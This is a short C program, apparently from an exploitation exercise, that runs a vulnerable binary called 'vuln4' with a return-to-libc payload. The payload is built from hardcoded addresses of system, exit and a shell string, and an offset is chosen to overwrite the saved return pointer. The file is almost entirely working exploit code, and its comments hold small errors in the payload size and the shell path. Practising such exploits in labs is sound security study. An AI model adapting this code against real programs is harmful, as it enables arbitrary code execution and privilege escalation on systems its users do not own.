#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define NOP 0x90

// shellcode 45 bits
char shellcode[] =
// consist of address of "system","exit","\bin\sh";
 "\x80\x2d\xe4\xb7\xb0\x69\xe3\xb7\x3f\x3a\xf6\xb7";

int main() {

char *name[4];

name[0] = "vuln4";
name[1] = shellcode;
name[2] = "116";		// set offset, let pointer point to the ret
name[3] = NULL;
execve(name[0], name, NULL);
return 0;
}